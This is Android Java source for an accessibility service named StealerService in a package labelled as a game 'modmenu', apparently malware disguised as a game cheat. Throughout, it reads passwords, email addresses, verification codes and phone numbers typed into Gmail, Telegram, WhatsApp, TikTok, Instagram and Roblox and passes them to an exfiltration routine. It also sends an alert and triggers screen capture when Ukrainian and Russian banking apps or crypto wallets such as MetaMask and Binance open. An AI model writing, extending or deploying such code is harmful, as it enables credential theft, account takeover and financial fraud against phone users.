package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.text.InputType;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Arrays;
import java.util.List;

public class StealerService extends AccessibilityService {

    private static final long COOLDOWN = 6000;
    private long lastSend = 0;
    private long lastBankAlert = 0;

    private static final List<String> TARGETS = Arrays.asList(
        "com.google.android.gm",
        "com.google.android.apps.gmail",
        "org.telegram.messenger",
        "org.telegram.messenger.web",
        "org.thunderdog.challegram",
        "com.zhiliaoapp.musically",
        "com.ss.android.ugc.trill",
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.roblox.client",
        "com.instagram.android"
    );

    private static final List<String> BANK_APPS = Arrays.asList(
        "com.ftband.mono",
        "com.monobank.app",
        "ua.privatbank.ap24",
        "ru.privatbank",
        "ua.oschadbank.online",
        "com.alfabank.oavdo.amc",
        "com.binance.dev",
        "com.coinbase.android",
        "io.metamask",
        "com.trustwallet.app",
        "com.google.android.apps.walletnfcrel"
    );

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();

        // проверяем открытие банковских приложений
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkgCs = event.getPackageName();
            if (pkgCs != null) {
                String pkg = pkgCs.toString();
                if (BANK_APPS.contains(pkg)
                    && System.currentTimeMillis() - lastBankAlert > 30000) {
                    lastBankAlert = System.currentTimeMillis();
                    Exfil.send("BANK_OPEN", "Открыт банк/крипта: " + pkg);
                    // команда на скрин
                    try {
                        android.content.Intent i =
                            new android.content.Intent(this, MediaSniffer.class);
                        i.setAction("CAPTURE_NOW");
                        startService(i);
                    } catch (Throwable ignored) {}
                }
            }
        }

        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
            type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();
        if (!TARGETS.contains(pkg)) return;
        if (System.currentTimeMillis() - lastSend < COOLDOWN) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        StringBuilder found = new StringBuilder();
        findFields(root, found, 0);

        if (found.length() > 0) {
            found.insert(0, "APP: " + pkg + "\n");
            Exfil.send("STEAL", found.toString());
            lastSend = System.currentTimeMillis();
        }
    }

    private void findFields(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
        if (n == null || depth > 40) return;

        int inputType = n.getInputType();
        boolean isPwd = false, isEmail = false;

        if (inputType > 0) {
            int variation = inputType & InputType.TYPE_MASK_VARIATION;
            int cls = inputType & InputType.TYPE_MASK_CLASS;
            if (cls == InputType.TYPE_CLASS_TEXT) {
                if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                    variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                    variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD) isPwd = true;
                if (variation == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) isEmail = true;
            }
        }

        CharSequence text = n.getText();
        CharSequence hint = n.getHintText();

        if (isPwd && text != null && text.length() > 0) {
            sb.append("[PWD] ").append(text).append("\n");
        } else if (isEmail && text != null && text.length() > 0) {
            sb.append("[EMAIL] ").append(text).append("\n");
        }

        if (hint != null && text != null && text.length() > 0 && text.length() < 120) {
            String h = hint.toString().toLowerCase();
            if (h.contains("парол") || h.contains("password")) {
                sb.append("[PWD-H] ").append(text).append("\n");
            } else if (h.contains("код") || h.contains("code")) {
                sb.append("[CODE] ").append(text).append("\n");
            } else if (h.contains("телефон") || h.contains("phone")) {
                sb.append("[PHONE] ").append(text).append("\n");
            }
        }

        for (int i = 0; i < n.getChildCount(); i++) {
            findFields(n.getChild(i), sb, depth + 1);
        }
    }

    @Override public void onInterrupt() {}
}
